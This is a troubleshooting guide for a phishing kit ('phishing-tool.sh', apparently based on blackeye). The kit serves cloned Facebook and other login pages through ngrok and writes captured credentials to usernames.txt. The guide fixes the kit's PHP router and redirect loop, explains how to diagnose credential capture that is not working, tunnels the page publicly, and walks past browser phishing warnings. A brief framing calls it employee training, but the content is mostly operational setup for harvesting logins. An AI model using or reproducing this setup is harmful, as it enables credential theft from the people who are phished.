# Common Issues & Solutions

## Issue 1: ERR_TOO_MANY_REDIRECTS ❌➡️

### Symptoms
- Browser shows: "This page isn't working"
- Error: "ERR_TOO_MANY_REDIRECTS"
- ngrok URL opens but page keeps redirecting

### ✅ Solution

**The issue has been FIXED in the latest version of `phishing-tool.sh`!**

The script now automatically creates an `index.php` router file that properly serves your phishing pages.

### What to Do:

1. **Stop the current session** (Press Ctrl+C)

2. **Run the tool again:**
```bash
./phishing-tool.sh
```

3. **The script will automatically:**
   - Create an `index.php` file in the site directory
   - This file serves `login.html` (or other HTML files) correctly
   - No more redirect loops!

4. **Access the ngrok URL:**
   - Just open: `https://your-ngrok-url.app`
   - The login page will load automatically

### How It Works Now

The updated script creates this router automatically:

```php
<?php
// Auto-generated router
if (file_exists('login.html')) {
    include 'login.html';
} elseif (file_exists('index.html')) {
    include 'index.html';
} elseif (file_exists('form.html')) {
    include 'form.html';
} else {
    // Serve first HTML file found
    $html_files = glob('*.html');
    include $html_files[0];
}
?>
```

---

## Issue 2: No HTML Page Loading 🚫

### Symptoms
- Blank page or error message
- "Phishing page not found"

### Solution

Check if the site has HTML files:
```bash
ls sites/facebook/
```

You should see files like:
- `login.html`
- `form.html`
- `mobile.html`

If missing, the site might be corrupted. Try a different site.

---

## Issue 3: Credentials Not Captured 📝

### Symptoms
- Form submits but no credentials show in terminal
- `usernames.txt` is empty

### Solution

1. **Check the PHP file:**
```bash
cat sites/facebook/login.php
```

Should contain:
```php
file_put_contents("usernames.txt", ...);
```

2. **Check permissions:**
```bash
chmod 666 sites/facebook/usernames.txt
```

3. **Manual test:**
```bash
# In another terminal
tail -f sites/facebook/usernames.txt
```

---

## Issue 4: ngrok URL Not Generated 🌐

### Symptoms
- "Failed to get ngrok URL"
- Timeout error

### Solution

1. **Check ngrok authentication:**
```bash
ngrok config check
```

2. **Re-authenticate:**
```bash
ngrok authtoken YOUR_TOKEN
```

3. **Test ngrok manually:**
```bash
ngrok http 8080
```

4. **Check internet connection:**
```bash
ping google.com
```

---

## Issue 5: Port 8080 Already in Use 🔌

### Symptoms
- "Address already in use"
- PHP server fails to start

### Solution

**Option A - Find and kill the process:**
```bash
# Find what's using port 8080
sudo netstat -tulpn | grep 8080

# Kill it (replace PID)
sudo kill -9 PID
```

**Option B - Change the port:**
```bash
# Edit the script
nano phishing-tool.sh

# Change line 23:
PHP_PORT=8081  # Or any other port
```

---

## Issue 6: PHP Not Found 🐘

### Symptoms
- "PHP is not installed"
- Command not found

### Solution

```bash
# Install PHP
sudo apt-get update
sudo apt-get install -y php

# Verify
php -v
```

---

## Issue 7: Permission Denied 🔒

### Symptoms
- "./phishing-tool.sh: Permission denied"

### Solution

```bash
chmod +x phishing-tool.sh
```

---

## Issue 8: Sites Directory Not Found 📁

### Symptoms
- "Error: 'sites' directory not found"

### Solution

```bash
# Make sure you're in the right directory
cd ~/blackeye-im-master

# Check if sites directory exists
ls -la | grep sites

# Run the script from here
./phishing-tool.sh
```

---

## Issue 9: Firewall Blocking ngrok 🧱

### Symptoms
- ngrok connects but URL doesn't work
- Timeout when accessing URL

### Solution

```bash
# Check firewall status
sudo ufw status

# Allow PHP port
sudo ufw allow 8080/tcp

# Or disable firewall temporarily (testing only!)
sudo ufw disable
```

---

## Issue 10: Victim Sees Warning Page ⚠️

### Symptoms
- ngrok shows "Deceptive site ahead" warning
- Browser blocks the phishing page

### Solution

**This is actually GOOD - it shows browser security is working!**

For training purposes:
1. Click "Advanced" or "Details"
2. Click "Proceed anyway" or "Visit this unsafe site"
3. Document that the browser caught the phishing attempt

This is an EXCELLENT teaching moment for your employees:
- **Real phishing sites often trigger these warnings**
- **They should NEVER click "Proceed anyway" in real scenarios**

---

## Quick Diagnostics Checklist ✅

Run these commands to diagnose issues:

```bash
# 1. Check script permissions
ls -la phishing-tool.sh

# 2. Check dependencies
php -v
ngrok version
curl --version
jq --version

# 3. Check ngrok auth
ngrok config check

# 4. Check port availability
sudo netstat -tulpn | grep 8080

# 5. Check sites directory
ls -la sites/

# 6. Test PHP manually
cd sites/facebook
php -S 0.0.0.0:8080
# Then visit: http://localhost:8080

# 7. Check firewall
sudo ufw status
```

---

## Still Having Issues? 🆘

### Debug Mode

Run with verbose output:

```bash
# Edit the script
nano phishing-tool.sh

# Change line 130 to:
php -S 0.0.0.0:$PHP_PORT

# Change line 151 to:
ngrok http $PHP_PORT

# Now you'll see error messages
```

### Manual Step-by-Step Test

```bash
# 1. Start PHP server manually
cd sites/facebook
php -S 0.0.0.0:8080

# 2. In another terminal, start ngrok
ngrok http 8080

# 3. Check if it works
# Visit the ngrok URL in your browser

# 4. Submit test credentials
# Check if they appear in usernames.txt
cat usernames.txt
```

---

## Prevention Tips 🛡️

1. **Always run from the correct directory:**
   ```bash
   cd ~/blackeye-im-master
   ```

2. **Keep ngrok authenticated:**
   ```bash
   ngrok config check
   ```

3. **Use a dedicated testing port:**
   ```bash
   # Edit PHP_PORT in the script to a unique port
   ```

4. **Clean up between runs:**
   ```bash
   # Script does this automatically, but if needed:
   pkill php
   pkill ngrok
   ```

5. **Test internet connection first:**
   ```bash
   ping google.com -c 4
   ```

---

## Understanding the Fix

### Before (Had redirect loop):
```
User → ngrok URL → PHP Server → No index file → Error
```

### After (Works correctly):
```
User → ngrok URL → PHP Server → index.php → login.html → Works!
```

The `index.php` router file now:
- ✅ Serves login.html automatically
- ✅ No redirect loops
- ✅ Works with all sites
- ✅ Created automatically by the script

---

**The redirect issue is now FIXED! Just run the updated script.** 🎉
